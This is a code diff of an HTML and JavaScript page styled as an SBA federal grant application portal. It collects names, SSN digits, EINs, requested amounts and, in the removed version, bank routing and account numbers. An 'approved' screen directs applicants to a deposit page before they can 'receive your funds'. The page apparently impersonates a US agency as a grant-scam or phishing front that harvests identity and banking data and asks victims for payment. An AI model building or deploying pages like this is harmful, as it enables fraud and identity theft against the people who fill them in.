@@ -4,239 +4,106 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Grant Application | SBA Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
     <style>
-        .form-section-header { display: flex; align-items: center; gap: 12px; margin: 32px 0 20px; padding-bottom: 12px; border-bottom: 2px solid var(--navy-light); }
-        .form-section-num { width: 28px; height: 28px; background: var(--navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; }
-        .form-section-title { font-weight: 800; color: var(--navy); text-transform: uppercase; letter-spacing: 0.05em; font-size: 0.9rem; }
+        .form-section { margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid var(--border); }
+        .form-section-header { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; color: var(--sba-navy); }
+        .section-num { background: var(--sba-navy); color: white; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 800; }
+        .status-badge-big { padding: 30px; text-align: center; border-radius: var(--radius-lg); background: var(--sba-blue-light); border: 2px dashed var(--sba-navy); }
     </style>
 </head>
-<body>
-    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
+<body style="background: #f1f5f9;">
 
-    <div class="app-layout">
-        <aside class="app-sidebar" id="appSidebar"></aside>
-        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
+    <div class="container" style="max-width: 900px;">
+        <!-- Header -->
+        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 40px;">
+            <img src="sba-logo.png" alt="SBA Logo" style="height: 50px;">
+            <a href="dashboard.html" class="btn btn-outline"><i class="fa-solid fa-house"></i> Exit to Dashboard</a>
+        </div>
 
-        <main class="app-main">
-            <header class="page-header" id="pageHeader"></header>
-
-            <div class="app-main__content">
-                <div id="contentTarget">
-                    <!-- Dynamic content: Locked, Status, or Form -->
+        <!-- Conditional View Wrapper -->
+        <div id="applicationView">
+            <div class="card">
+                <div style="background: var(--sba-navy); color: white; padding: 20px; margin: -24px -24px 30px -24px; border-radius: 8px 8px 0 0;">
+                    <h2 style="font-size: 1.25rem;">Application for Federal Assistance (Form 424-B)</h2>
+                    <p style="font-size: 12px; opacity: 0.8;">OMB Control Number: 4040-0007 | Expiration: 12/31/2025</p>
                 </div>
+
+                <form id="grantForm">
+                    <!-- Section 1: Personal Info -->
+                    <div class="form-section">
+                        <div class="form-section-header">
+                            <span class="section-num">1</span>
+                            <h4>Individual Applicant Information</h4>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group"><label class="form-label">Full Legal Name</label><input type="text" class="form-input" id="app-name" required></div>
+                            <div class="form-group"><label class="form-label">SSN (Last 4 Digits)</label><input type="password" maxlength="4" class="form-input" id="app-ssn" required></div>
+                        </div>
+                    </div>
+
+                    <!-- Section 2: Business Profile -->
+                    <div class="form-section">
+                        <div class="form-section-header">
+                            <span class="section-num">2</span>
+                            <h4>Business Entity Details</h4>
+                        </div>
+                        <div class="form-group"><label class="form-label">Legal Business Name</label><input type="text" class="form-input" id="app-biz-name" required></div>
+                        <div class="form-row">
+                            <div class="form-group"><label class="form-label">EIN (Tax ID)</label><input type="text" class="form-input" id="app-ein" placeholder="00-0000000" required></div>
+                            <div class="form-group">
+                                <label class="form-label">Business Type</label>
+                                <select class="form-input" id="app-biz-type">
+                                    <option>LLC</option><option>Corporation</option><option>Sole Proprietorship</option><option>Non-Profit</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Section 3: Funding -->
+                    <div class="form-section">
+                        <div class="form-section-header">
+                            <span class="section-num">3</span>
+                            <h4>Proposed Project Funding</h4>
+                        </div>
+                        <div class="form-group"><label class="form-label">Requested Grant Amount ($)</label><input type="number" class="form-input" id="app-amount" placeholder="50000" required></div>
+                        <div class="form-group"><label class="form-label">Primary Use of Funds</label><textarea class="form-input" rows="3" id="app-use" placeholder="E.g. Inventory, Payroll, Equipment..."></textarea></div>
+                    </div>
+
+                    <!-- Section 4: Certification -->
+                    <div class="form-section" style="border: none;">
+                        <div class="form-section-header">
+                            <span class="section-num">4</span>
+                            <h4>Authorized Certification</h4>
+                        </div>
+                        <div style="display: flex; gap: 10px; align-items: flex-start;">
+                            <input type="checkbox" style="margin-top: 5px;" required>
+                            <p style="font-size: 13px; color: var(--text-secondary);">I certify that the statements herein are true, complete and accurate to the best of my knowledge. I am aware that any false, fictitious, or fraudulent statements or claims may subject me to criminal, civil, or administrative penalties.</p>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary btn-full" id="submitAppBtn">Submit Official Application</button>
+                </form>
             </div>
-        </main>
+        </div>
     </div>
 
     <script type="module">
-        import { db, serverTimestamp, updateUserData, addLedgerEntry, notify, notifyAdmins } from './firebase-config.js';
-        import { requireAuth, buildSidebar, buildPageHeader, initTheme, initNotificationBadge, setButtonLoading, showToast, formatCurrency } from './app.js';
-
+        import { requireAuth } from './app.js';
         requireAuth((user, userData) => {
-            initTheme();
-            buildSidebar({ activeId: 'apply', userData });
-            buildPageHeader({ title: 'Grant Application', subtitle: 'Form 424-B · Federal Assistance Program', backUrl: 'dashboard.html' });
-            initNotificationBadge(user.uid);
-
-            const target = document.getElementById('contentTarget');
-
-            // 1. KYC Check
-            if (userData.kycStatus !== 'APPROVED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
-                        <h2 class="status-screen__title">Identity Verification Required</h2>
-                        <p class="status-screen__message">To comply with federal regulations, you must verify your identity before submitting a grant application.</p>
-                        <a href="kyc.html" class="btn btn--primary">Verify Identity Now</a>
+            // Check if application is already submitted
+            if(userData.applyStatus === 'pending') {
+                document.getElementById('applicationView').innerHTML = `
+                    <div class="status-badge-big">
+                        <i class="fa-solid fa-file-shield" style="font-size: 3rem; color: var(--sba-navy); margin-bottom: 20px;"></i>
+                        <h2 style="color: var(--sba-navy);">Application Under Review</h2>
+                        <p style="color: var(--text-secondary); margin: 10px 0 25px;">Your Form 424-B has been successfully transmitted. A Federal Case Officer will contact you within 48 hours.</p>
+                        <a href="dashboard.html" class="btn btn-primary">Return to Dashboard</a>
                     </div>
                 `;
-                return;
-            }
-
-            // 2. Status Logic
-            if (userData.applyStatus === 'PENDING' || userData.applyStatus === 'UNDER_REVIEW') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--pending"><i class="fa-solid fa-clock-rotate-left"></i></div>
-                        <h2 class="status-screen__title">Application ${userData.applyStatus === 'PENDING' ? 'Submitted' : 'Under Review'}</h2>
-                        <p class="status-screen__message">Your application for the SBA Grant Program is currently being processed by our review board. Estimated time: 3-5 business days.</p>
-                        <a href="dashboard.html" class="btn btn--secondary">Return to Dashboard</a>
-                    </div>
-                `;
-            } else if (userData.applyStatus === 'APPROVED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--success"><i class="fa-solid fa-circle-check"></i></div>
-                        <h2 class="status-screen__title">Application Approved!</h2>
-                        <p class="status-screen__message">Congratulations! Your application has been approved. Please proceed to complete the next steps to receive your funds.</p>
-                        <a href="deposit.html" class="btn btn--primary">Proceed to Next Step</a>
-                    </div>
-                `;
-            } else if (userData.applyStatus === 'REJECTED') {
-                target.innerHTML = `
-                    <div class="status-screen card">
-                        <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-circle-xmark"></i></div>
-                        <h2 class="status-screen__title">Application Declined</h2>
-                        <p class="status-screen__message">Reason: ${userData.application?.rejectReason || 'Does not meet program criteria.'}</p>
-                        <button class="btn btn--primary" id="btnRetry">Submit New Application</button>
-                    </div>
-                `;
-                document.getElementById('btnRetry').onclick = async () => {
-                    await updateUserData(user.uid, { applyStatus: 'IDLE' });
-                    window.location.reload();
-                };
-            } else {
-                // 3. Render Form
-                renderForm(user, userData, target);
             }
         });
-
-        function renderForm(user, userData, target) {
-            target.innerHTML = `
-                <div class="card">
-                    <form id="applyForm">
-                        <div class="form-section-header">
-                            <div class="form-section-num">01</div>
-                            <div class="form-section-title">Personal Identity</div>
-                        </div>
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Full Legal Name</label>
-                                <input type="text" id="f-name" class="form-input" value="${userData.fullName}" required>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label form-label--required">SSN (Last 4)</label>
-                                <input type="password" id="f-ssn" class="form-input" maxlength="4" placeholder="••••" required>
-                            </div>
-                        </div>
-
-                        <div class="form-section-header">
-                            <div class="form-section-num">02</div>
-                            <div class="form-section-title">Business Profile</div>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Legal Business Name</label>
-                            <input type="text" id="f-bizName" class="form-input" required>
-                        </div>
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Entity Type</label>
-                                <select id="f-bizType" class="form-select" required>
-                                    <option value="LLC">LLC</option>
-                                    <option value="Corporation">Corporation</option>
-                                    <option value="Sole Proprietorship">Sole Proprietorship</option>
-                                    <option value="Nonprofit">Nonprofit</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label form-label--required">EIN (XX-XXXXXXX)</label>
-                                <input type="text" id="f-ein" class="form-input" placeholder="00-0000000" required>
-                            </div>
-                        </div>
-
-                        <div class="form-section-header">
-                            <div class="form-section-num">03</div>
-                            <div class="form-section-title">Grant Details</div>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Requested Amount ($50k - $500k)</label>
-                            <input type="number" id="f-amount" class="form-input" min="50000" max="500000" placeholder="0.00" required>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Grant Purpose</label>
-                            <textarea id="f-purpose" class="form-textarea" rows="4" placeholder="How will these funds help your business?" required></textarea>
-                        </div>
-
-                        <div class="form-section-header">
-                            <div class="form-section-num">04</div>
-                            <div class="form-section-title">Banking Information</div>
-                        </div>
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Bank Name</label>
-                                <input type="text" id="f-bankName" class="form-input" required>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Account Holder</label>
-                                <input type="text" id="f-holder" class="form-input" required>
-                            </div>
-                        </div>
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Routing Number</label>
-                                <input type="text" id="f-routing" class="form-input" maxlength="9" required>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label form-label--required">Account Number</label>
-                                <input type="text" id="f-account" class="form-input" required>
-                            </div>
-                        </div>
-
-                        <div class="alert alert--info mb-6 mt-4">
-                            <i class="fa-solid fa-shield-check"></i>
-                            <span>I certify that the information provided is true and accurate. I understand that misrepresentation is subject to federal prosecution.</span>
-                        </div>
-
-                        <button type="submit" class="btn btn--primary btn--full btn--lg" id="btnSubmit">Submit Official Application</button>
-                    </form>
-                </div>
-            `;
-
-            document.getElementById('applyForm').onsubmit = async (e) => {
-                e.preventDefault();
-                const btn = document.getElementById('btnSubmit');
-                setButtonLoading(btn, true, 'Transmitting to SBA...');
-
-                const amount = parseFloat(document.getElementById('f-amount').value);
-                const application = {
-                    fullName: document.getElementById('f-name').value,
-                    ssn: document.getElementById('f-ssn').value,
-                    bizName: document.getElementById('f-bizName').value,
-                    bizType: document.getElementById('f-bizType').value,
-                    ein: document.getElementById('f-ein').value,
-                    grantAmount: amount,
-                    grantPurpose: document.getElementById('f-purpose').value,
-                    bankName: document.getElementById('f-bankName').value,
-                    accountHolder: document.getElementById('f-holder').value,
-                    routingNumber: document.getElementById('f-routing').value,
-                    accountNumber: document.getElementById('f-account').value,
-                    submittedAt: serverTimestamp()
-                };
-
-                try {
-                    await updateUserData(user.uid, { 
-                        application, 
-                        applyStatus: 'PENDING',
-                        requestedAmount: amount 
-                    });
-                    await addLedgerEntry(user.uid, {
-                        type: 'application',
-                        amount: amount,
-                        description: 'Grant Application Submitted',
-                        status: 'PENDING'
-                    });
-                    await notify(user.uid, {
-                        title: 'Application Received',
-                        message: `Your application for ${formatCurrency(amount)} has been successfully submitted.`,
-                        type: 'info',
-                        sendEmail: true
-                    });
-                    await notifyAdmins({
-                        title: 'New Application',
-                        message: `${userData.fullName} applied for ${formatCurrency(amount)}`,
-                        type: 'action'
-                    });
-                    showToast('Application submitted successfully', 'success');
-                    window.location.reload();
-                } catch (err) {
-                    setButtonLoading(btn, false);
-                    showToast('Submission failed. Try again.', 'error');
-                }
-            };
-        }
     </script>
 </body>
 </html>
